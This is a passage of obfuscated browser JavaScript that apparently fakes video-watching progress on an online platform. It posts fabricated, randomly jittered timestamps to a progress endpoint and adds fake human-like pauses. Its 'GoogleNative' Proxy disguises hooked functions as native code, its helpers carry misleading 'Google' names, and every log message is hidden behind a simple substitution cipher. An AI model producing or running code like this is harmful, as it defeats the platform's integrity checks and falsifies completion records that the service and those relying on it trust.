        if (key === 'x' && !_0xkill && !_0xarmed) { _0xkill = true; controller.abort(); Log.say(_0xlex.C(6), _0xlex.P(25,[_0xlex.d("5GLBGLE]BMUL]?DRCP]RFGQ]AFMPC]—]N?SQGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d("#LBGLE]RFC]QFGDR]?DRCP]RFGQ]AFMPC]—]ASRRGLE]MSR]?DRCP]RFC]AFCAINMGLRk"),_0xlex.d("5GLBGLE]BMUL]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]LCVR]AFCAINMGLRk"),_0xlex.d("5GLBGLE]BMUL]?DRCP]RFGQ]AFMPC]—]AFCAIGLE]MSR]?R]RFC]@MSLB?PWk"),_0xlex.d("5GLBGLE]BMUL]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d(".?AIGLE]SN]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]LCVR]AFCAINMGLRk"),_0xlex.d("5P?NNGLE]SN]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]LCVR]AFCAINMGLRk"),_0xlex.d("5P?NNGLE]SN]?DRCP]RFGQ]AFMPC]—]ASRRGLE]MSR]?DRCP]RFC]AFCAINMGLRk"),_0xlex.d(".?AIGLE]SN]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d("!JMQGLE]MSR]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d("#LBGLE]RFC]QFGDR]?DRCP]RFGQ]AFMPC]—]N?SQGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d(".?AIGLE]SN]?DRCP]RFGQ]AFMPC]—]AFCAIGLE]MSR]?R]RFC]@MSLB?PWk"),_0xlex.d("5P?NNGLE]SN]?DRCP]RFGQ]AFMPC]—]QRMNNGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d("5P?NNGLE]SN]?DRCP]RFGQ]AFMPC]—]N?SQGLE]?R]RFC]AFCAINMGLRk"),_0xlex.d("!JMQGLE]MSR]?DRCP]RFGQ]AFMPC]—]ASRRGLE]MSR]?DRCP]RFC]AFCAINMGLRk")])); }
        if (key === 'r' && _0xarmed) { Log.say(_0xlex.C(9), _0xlex.P(27,[_0xlex.d("%GTGLE]RFC]PSE]?]QF?IC]—]QCC]WMS]ML]RFC]MRFCP]QGBCk"),_0xlex.d("0MJJGLE]SN]RFC]PSE]—]@?AI]GL]?]KMKCLRk"),_0xlex.d("0MJJGLE]SN]RFC]PSE]—]QCC]WMS]?DRCP]RFC]PCDPCQFk"),_0xlex.d("1F?IGLE]RFGLEQ]MSR]—]QCC]WMS]ML]RFC]DJGN]QGBCk"),_0xlex.d("1F?IGLE]RFGLEQ]MSR]—]@?AI]GL]?]KMKCLRk"),_0xlex.d("1F?IGLE]RFGLEQ]MSR]—]QCC]WMS]?DRCP]RFC]PCDPCQFk"),_0xlex.d("%GTGLE]RFC]PSE]?]QF?IC]—]QCC]WMS]ML]RFC]DJGN]QGBCk"),_0xlex.d("0MJJGLE]SN]RFC]PSE]—]A?RAF]WMS]ML]RFC]PCJM?Bk"),_0xlex.d("1F?IGLE]MSR]RFC]PSE]—]A?RAF]WMS]ML]RFC]PCJM?Bk"),_0xlex.d("1F?IGLE]MSR]RFC]PSE]—]QCC]WMS]ML]RFC]DJGN]QGBCk"),_0xlex.d("1F?IGLE]MSR]RFC]PSE]—]@?AI]GL]?]KMKCLRk"),_0xlex.d("0MJJGLE]SN]RFC]PSE]—]QCC]WMS]ML]RFC]DJGN]QGBCk"),_0xlex.d("%GTGLE]RFC]PSE]?]QF?IC]—]@?AI]GL]?]KMKCLRk"),_0xlex.d("1F?IGLE]MSR]RFC]K?R]—]QCC]WMS]ML]RFC]DJGN]QGBCk"),_0xlex.d("1F?IGLE]MSR]RFC]K?R]—]QCC]WMS]?DRCP]RFC]PCDPCQFk")])); GoogleRelease(); setTimeout(() => location.reload(), 1500); }
      };
      document.addEventListener("keydown", _0xchord, true);
      _0xe8a7(() => document.removeEventListener("keydown", _0xchord, true));

      const GooglePost = _0x9.post.bind(_0x9);
      const GoogleGet = _0x9.get.bind(_0x9);
      const _0xsend = _0x8.dispatch.bind(_0x8);
      const _0xon = _0x8.subscribe.bind(_0x8);
      const _0xoff = _0x8.unsubscribe.bind(_0x8);

      const GoogleCall = (fn, critical = false) => async (opts) => {
        let tries = 0;
        while (tries < 3 && !signal.aborted) {
          try {
            const finalOpts = (opts && typeof opts.url === "string") ? opts : null;
            if (!finalOpts || finalOpts.url === "" || !finalOpts.url.startsWith("/")) {
              Log.warn(`[Google] Request skipped — unusable URL (${opts && opts.url !== null && opts.url !== undefined ? typeof opts.url : "none"}).`);
              return { body: {}, skipped: true };
            }
            const res = await fn(finalOpts);
            if (_0xheat > 1) _0xheat = Math.max(1, _0xheat - 0.1);
            return res;
          } catch (e) {
            const st = e?.status ?? e?.body?.status ?? 0;
            if (st === 401) { if (critical) { _0xkill = true; controller.abort(); Log.say(_0xlex.C(0), _0xlex.P(3,[_0xlex.d("~SRF]QRMNNCB]FMJBGLE]—]N?AIGLE]SNk"),_0xlex.d(")CW]QRMNNCB]DGRRGLE]—]N?AIGLE]SNk"),_0xlex.d("1CQQGML]ICW]RSPLCB]QR?JC]—]UP?NNGLE]RFC]EC?Pk"),_0xlex.d("2FC]ICW]LM]JMLECP]DGRQ]—]N?AIGLE]SNk"),_0xlex.d("1CQQGML]ICW]RSPLCB]QR?JC]—]A?JJGLE]GR]FCPCk"),_0xlex.d("~SRF]QRMNNCB]FMJBGLE]—]CLBGLE]RFC]PSLk"),_0xlex.d("~SRF]QRMNNCB]FMJBGLE]—]UP?NNGLE]RFC]EC?Pk"),_0xlex.d("1CQQGML]ICW]RSPLCB]QR?JC]—]N?AIGLE]SNk"),_0xlex.d("2FC]ICW]LM]JMLECP]DGRQ]—]UP?NNGLE]RFC]EC?Pk"),_0xlex.d("~SRF]QRMNNCB]FMJBGLE]—]QRMNNGLE]AJC?LJWk"),_0xlex.d(")CW]QRMNNCB]DGRRGLE]—]A?JJGLE]GR]FCPCk"),_0xlex.d("2FC]ICW]A?KC]@?AI]PCHCARCB]—]UP?NNGLE]RFC]EC?Pk"),_0xlex.d(")CW]QRMNNCB]DGRRGLE]—]QRMNNGLE]AJC?LJWk"),_0xlex.d("1CQQGML]ICW]RSPLCB]QR?JC]—]DMJBGLE]SN]QFMNk"),_0xlex.d("-SP]ICW]QRMNNCB]SLJMAIGLE]—]UP?NNGLE]RFC]EC?Pk")])); } throw e; }
            if (st === 429) {
              _0xheat = Math.min(4, _0xheat * 1.5);
              const retryAfter = Number(e?.body?.retry_after ?? e?.retry_after ?? 4);
              const s = Number.isFinite(retryAfter) && retryAfter >= 0 ? Math.min(300, Math.ceil(retryAfter) + 1 + Math.random()) : 5 + Math.random() * 2;
              Log.say(_0xlex.C(7), _0xlex.P(30,[`${_0xlex.d("2FC]A?JJ]U?Q]RFPMRRJCB]—]@?AIGLE]MDD]\\")}${Math.ceil(s)}${_0xlex.d("Qi]RFCL]ILMAIGLE]?E?GLk")}`,`${_0xlex.d("-SP]ILMAI]U?Q]RFPMRRJCB]—]PCRPWGLE]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("0COSCQR]A?KC]@?AI]RFPMRRJCB]—]PCRPWGLE]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("2FC]A?JJ]U?Q]RFPMRRJCB]—]RPWGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d(")LMAI]A?KC]@?AI]RFPMRRJCB]—]LCVR]?RRCKNR]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("0COSCQR]A?KC]@?AI]RFPMRRJCB]—]@?AIGLE]MDD]\\")}${Math.ceil(s)}${_0xlex.d("Qi]RFCL]ILMAIGLE]?E?GLk")}`,`${_0xlex.d("2FC]A?JJ]U?Q]RFPMRRJCB]—]PCRPWGLE]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("2FC]ILMAI]EMR]RFPMRRJCB]—]@?AIGLE]MDD]\\")}${Math.ceil(s)}${_0xlex.d("Qi]RFCL]ILMAIGLE]?E?GLk")}`,`${_0xlex.d("0COSCQR]A?KC]@?AI]RFPMRRJCB]—]RPWGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d(")LMAI]A?KC]@?AI]RFPMRRJCB]—]PCRPWGLE]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("0COSCQR]A?KC]@?AI]RFPMRRJCB]—]ILMAIGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("2FC]A?JJ]U?Q]RFPMRRJCB]—]ILMAIGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("-SP]ILMAI]U?Q]RFPMRRJCB]—]ILMAIGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d("-SP]ILMAI]U?Q]RFPMRRJCB]—]RPWGLE]?E?GL]GL]\\")}${Math.ceil(s)}${_0xlex.d("Qk")}`,`${_0xlex.d(")LMAI]A?KC]@?AI]RFPMRRJCB]—]@?AIGLE]MDD]\\")}${Math.ceil(s)}${_0xlex.d("Qi]RFCL]ILMAIGLE]?E?GLk")}`]));
              await GoogleDelayRaw(s * 1000); tries++; continue;
            }
            if (st >= 500 && st < 600) { 
              const backoff = Math.pow(2, tries) * 2 + (Math.random() * 2); 
              Log.say(_0xlex.C(7), _0xlex.P(31,[`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]RFCPC]—]@?AIGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]PCQRGLE]")}${backoff.toFixed(1)}${_0xlex.d("Q]@CDMPC]PCRPWk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]N?SQGLE]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]AMMJGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]RFCPC]—]AMMJGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]—]PCQRGLE]")}${backoff.toFixed(1)}${_0xlex.d("Q]@CDMPC]PCRPWk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]@?AIGLE]MDD]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]RFCPC]—]@?AIGLE]MDD]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]@?AIGLE]MDD]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]—]AMMJGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]—]N?SQGLE]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]RFCPC]—]PCQRGLE]")}${backoff.toFixed(1)}${_0xlex.d("Q]@CDMPC]PCRPWk")}`,`${_0xlex.d("1CPTCP]CPPMP]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]@?AIGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]RFCPC]—]@?AIGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`,`${_0xlex.d("1CPTCP]D?SJR]")}${st}${_0xlex.d("]ML]RF?R]ILMAI]—]@?AIGLE]MDD]DMP]")}${backoff.toFixed(1)}${_0xlex.d("Qk")}`])); 
              await GoogleDelayRaw(backoff * 1000); tries++; continue; 
            }
            throw e;
          }
        }
        throw new Error("Max retries exceeded");
      };
      const GooglePostSafe = GoogleCall(GooglePost, true);
      const GoogleGetSafe = GoogleCall(GoogleGet, false);

      const GoogleHook = (obj, key, fn) => {
        if (!obj || Object.isFrozen(obj) || Object.isSealed(obj)) { Log.say(_0xlex.C(0), _0xlex.P(4,[`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]PCHCARQ]FMMIQ]—]JC?TGLE]GR]SLRMSAFCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]DPMXCL]—]JC?TGLE]GR]SLRMSAFCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]PCHCARQ]FMMIQ]—]QIGNNGLE]RFC]FMMIk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]PC?BjMLJW]—]QIGNNGLE]RFC]FMMIk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]PC?BjMLJW]—]JC?TGLE]GR]SLRMSAFCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]PC?BjMLJW]—]FMMI]D?GJCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]GKKSR?@JC]—]A?LLMR]@C]FMMICBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]QC?JCB]—]QIGNNGLE]RFC]FMMIk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]QC?JCB]—]A?LLMR]@C]FMMICBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]DPMXCL]—]FMMI]D?GJCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]QC?JCB]—]JC?TGLE]GR]SLRMSAFCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]PCHCARQ]FMMIQ]—]FMMI]D?GJCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]DPMXCL]—]A?LLMR]@C]FMMICBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]GKKSR?@JC]—]FMMI]D?GJCBk")}`,`${_0xlex.d("2?PECR]")}${key}${_0xlex.d("]GQ]PC?BjMLJW]—]A?LLMR]@C]FMMICBk")}`])); return null; }
        try {
          const own = Object.getOwnPropertyDescriptor(obj, key);
          let cur = Object.getPrototypeOf(obj), d = null;
          while (cur && !d) { d = Object.getOwnPropertyDescriptor(cur, key); cur = d ? cur : Object.getPrototypeOf(cur); }
          const flags = d && !d.get ? { writable: !!d.writable, configurable: !!d.configurable, enumerable: !!d.enumerable } : { writable: false, configurable: true, enumerable: false };
          Object.defineProperty(obj, key, { value: fn, ...flags });
          return () => { try { if (own) Object.defineProperty(obj, key, own); else delete obj[key]; } catch (e) {} };
        } catch (e) { Log.say(_0xlex.C(0), _0xlex.P(5,[`${_0xlex.d("&MMI]KMSLRGLE]DMP]")}${key}${_0xlex.d("]CPPMPCB]")}${e.message}`,`${_0xlex.d("&MMI]QCRSN]DMP]")}${key}${_0xlex.d("]D?GJCB]")}${e.message}`,`${_0xlex.d("1CRRGLE]SN]RFC]FMMI]ML]")}${key}${_0xlex.d("]RFPCU]")}${e.message}`,`${_0xlex.d("!MSJB]LMR]KMSLR]RFC]FMMI]ML]")}${key}${_0xlex.d("]")}${e.message}`,`${_0xlex.d("&MMI]GLQR?JJ?RGML]D?GJCB]DMP]")}${key}${_0xlex.d("]")}${e.message}`,`${_0xlex.d("~RR?AFGLE]FMMIQ]RM]")}${key}${_0xlex.d("]D?GJCB]")}${e.message}`,`${_0xlex.d("+MSLRGLE]?]FMMI]ML]")}${key}${_0xlex.d("]D?GJCB]")}${e.message}`,`${_0xlex.d("2FC]")}${key}${_0xlex.d("]FMMI]PCDSQCB]RM]GLQR?JJ]")}${e.message}`,`${_0xlex.d("&MMI]UGPGLE]CPPMP]ML]")}${key}${_0xlex.d("]")}${e.message}`,`${_0xlex.d("!MSJB]LMR]UGPC]")}${key}${_0xlex.d("]")}${e.message}`,`${_0xlex.d(".?RAFGLE]")}${key}${_0xlex.d("]D?GJCB]")}${e.message}`,`${_0xlex.d("'LQR?JJGLE]RFC]FMMI]ML]")}${key}${_0xlex.d("]CPPMPCB]")}${e.message}`,`${_0xlex.d("&MMI]?RRCKNR]ML]")}${key}${_0xlex.d("]D?GJCB]")}${e.message}`,`${_0xlex.d("&MMI]GLQR?JJ]D?GJCB]ML]")}${key}${_0xlex.d("]")}${e.message}`,`${_0xlex.d("2FC]FMMI]AMSJB]LMR]@C]?RR?AFCB]RM]")}${key}${_0xlex.d("]")}${e.message}`])); return null; }
      };

      const GoogleNative = (fn, nativeStr, nameStr, lenNum) => new Proxy(fn, {
        get(target, prop, receiver) { if (prop === 'toString') return () => nativeStr; if (prop === 'name' && nameStr != null) return nameStr; if (prop === 'length' && lenNum != null) return lenNum; return Reflect.get(target, prop, receiver); },
        getOwnPropertyDescriptor(target, prop) { if (prop === 'toString') return Object.getOwnPropertyDescriptor(Function.prototype, 'toString'); return Reflect.getOwnPropertyDescriptor(target, prop); },
        apply(target, thisArg, args) { return Reflect.apply(target, thisArg, args); },
        has(target, prop) { return prop === 'toString' || Reflect.has(target, prop); },
        deleteProperty() { return false; }, defineProperty() { return false; }
      });

      const GoogleProgress = (data, task, cfgv) => {
        try {
          const candidates = cfgv === 1 ? [data?.userStatus?.streamProgressSeconds, data?.userStatus?.progress?.[task]?.value] : [data?.userStatus?.progress?.[task]?.value, data?.userStatus?.streamProgressSeconds, data?.progress?.[task]?.value];
          const valid = candidates.find(n => { if (n === null || n === undefined || n === "" || typeof n === "boolean") return false; const value = Number(n); return Number.isFinite(value) && value >= 0; });
          return valid === undefined ? null : Number(valid);
        } catch (e) { return null; }
      };

      const _0xbb86 = (body, taskName) => {
        if (!body || typeof body !== 'object') return null;
        if (typeof body.progress === 'number' && Number.isFinite(body.progress) && body.progress >= 0) return body.progress;
        const prog = body.progress?.[taskName] ?? body[taskName];
        if (prog === null || prog === undefined) return null;
        const val = typeof prog === 'object' ? prog.value : prog;
        const num = Number(val);
        return Number.isFinite(num) && num >= 0 ? num : null;
      };

      const _0x8d20 = (str) => String(str || "").replace(/[\/\\:*?"<>|]/g, "");

      const _0xvideo = async (v) => {
        Log.say(_0xlex.C(12), _0xlex.P(32,[`${_0xlex.d("-NCLGLE]RFC]@MMI]RM]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(" PGLEGLE]MSR]")}${v.name}${_0xlex.d("]DPMK]RFC]QR?AIk")}`,`${_0xlex.d("1R?PRGLE]SN]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(".SJJGLE]")}${v.name}${_0xlex.d("]MDD]RFC]QFCJDk")}`,`${_0xlex.d("-NCLGLE]")}${v.name}${_0xlex.d("dQ]AF?NRCPk")}`,`${_0xlex.d("1R?PRGLE]")}${v.name}${_0xlex.d("]DPMK]RFC]QFCJDk")}`,`${_0xlex.d("*?SLAFGLE]")}${v.name}${_0xlex.d("]DPMK]RFC]QFCJDk")}`,`${_0xlex.d("2SPLGLE]RM]")}${v.name}${_0xlex.d("]GL]RFC]@MMIk")}`,`${_0xlex.d(".GAIGLE]SN]RFC]@MMI]?R]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("%CRRGLE]")}${v.name}${_0xlex.d("]EMGLEk")}`,`${_0xlex.d("2?IGLE]BMUL]")}${v.name}${_0xlex.d("]DPMK]RFC]QFCJDk")}`,`${_0xlex.d("$JGNNGLE]RM]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("-NCLGLE]")}${v.name}${_0xlex.d("]GL]RFC]PC?BCPk")}`,`${_0xlex.d("1CRRJGLE]GL]UGRF]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("-NCLGLE]RFC]PC?BGLE]@MMI]DMP]")}${v.name}${_0xlex.d("k")}`]));
        let tick = 0, lastTs = 0;
        while (v.cur < v.goal && !_0xkill && !signal.aborted) {
          let _0x1c = Math.min(v.goal - v.cur, 4 + Math.random() * 8);
          await GoogleDelay(_0x1c); if (_0xkill || signal.aborted) break;
          if (Math.random() < 0.06) { Log.say(_0xlex.C(15), _0xlex.P(33,[_0xlex.d("~]OSGAI]QRCCN]—]RFCL]@?AI]RM]GRk"),_0xlex.d(")CRRJCdQ]ML]—]@PGCD]QRCCNk"),_0xlex.d("1RCCNGLE]@PGCDJW]—]ICRRJC]GQ]SNk"),_0xlex.d("2C?NMRdQ]ML]—]OSGAI]QRCCNk"),_0xlex.d(".MRdQ]QGLEGLE]—]@PGCD]N?SQCk"),_0xlex.d(")CRRJCdQ]ML]—]HSQR]?]QRCCNk"),_0xlex.d(")CRRJCdQ]AMKGLE]RM]RFC]@MGJ]—]QFMPR]U?GRk"),_0xlex.d(")CRRJC]ML]—]QRCNNGLE]?U?W]@PGCDJWk"),_0xlex.d(")CRRJC]QGLEGLE]—]OSGAI]N?SQCk"),_0xlex.d(".MRdQ]ML]—]OSGAI]QRCCNk"),_0xlex.d(" PGCD]QRCCN]UFGJC]RFC]NMR]EMCQk"),_0xlex.d("5?RCPdQ]FC?RGLE]—]@PGCD]QRCCNk"),_0xlex.d(".MRdQ]ML]RFC]@MGJ]—]@PGCD]N?SQCk"),_0xlex.d("/SGAI]QRCCN]—]ICRRJCdQ]MLk"),_0xlex.d(")CRRJCdQ]SN]—]QFMPR]N?SQCk")])); await GoogleDelay(18 + Math.random() * 24); if (_0xkill || signal.aborted) break; }
          const lastBeat = v.cur + _0x1c >= v.goal;
          let rawTs = lastBeat ? (v.goal + Math.random() * 1.4) : Math.min(v.goal, v.cur + _0x1c + Math.random());
          let ts = Math.round(Math.max(lastTs + 0.01, rawTs) * 100000) / 100000;
          const _0xmono = ts > lastTs;
          lastTs = ts;
          
          
          Log.diag("Timestamp sample", { tick, monotonic: _0xmono, decimals: String(ts).split(".")[1]?.length ?? 0 });
          
          if (tick === 0) Log.say(_0xlex.C(16), _0xlex.P(34,[`${_0xlex.d("2MAI]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]EP?GL]`")}${ts}`,`${_0xlex.d("1?LBQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]Q?LB]`")}${ts}`,`${_0xlex.d("1?LBQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]RMAI]`")}${ts}`,`${_0xlex.d("2MAI]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]Q?LB]`")}${ts}`,`${_0xlex.d("2MAI]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]RGAI]`")}${ts}`,`${_0xlex.d("1?LBQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]EP?GL]`")}${ts}`,`${_0xlex.d("%P?GLQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]RMAI]`")}${ts}`,`${_0xlex.d("1?LBQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]NC@@JC]`")}${ts}`,`${_0xlex.d("1CAMLBQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]Q?LB]`")}${ts}`,`${_0xlex.d(".C@@JCQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]Q?LB]`")}${ts}`,`${_0xlex.d("2MAI]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]NC@@JC]`")}${ts}`,`${_0xlex.d(".C@@JCQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]RMAI]`")}${ts}`,`${_0xlex.d("%P?GLQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]Q?LB]`")}${ts}`,`${_0xlex.d("%P?GLQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]EP?GL]`")}${ts}`,`${_0xlex.d(".C@@JCQ]J?LBGLE]UFMJCw]")}${Number.isInteger(ts)}${_0xlex.d("]—]RGAI]`")}${ts}`]));
          let _0x1d = await GooglePostSafe({ url: GoogleRoutes.videoProgress(v.q.id), body: { timestamp: ts } });
          const reported = _0xbb86(_0x1d?.body, v.taskType);
          if (reported !== null) v.cur = reported; else v.cur = Math.min(v.goal, v.cur + _0x1c);
          if (++tick % 3 === 1 || v.cur >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(35,[`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d(",MU]PC?BGLEw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur.toFixed(2)}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`]));
          if (_0x1d?.body?.completed_at) break;
        }
        if (v.cur >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xlex.d("0MSLBCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("5P?NNCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(" MVCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(")LMAICB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(".SR]RM]@CBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("\"CJGTCPCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("&?LBCB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1CRRJCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!FCAICB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MKNJCRCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!?QFCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JMQCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JC?PCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MLAJSBCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1C?JCBw]")}${v.name}${_0xlex.d("k")}`]));
      };

      const _0xplay = async (v) => {
        const taskId = Symbol(); _0x8844.add(taskId);
        let taskFinished = false; 
        const finishTask = () => { if (!taskFinished) { taskFinished = true; _0x8844.delete(taskId); } };
        
        return new Promise((resolve, reject) => {
          (async () => {
            let handedOff = false;
            try {
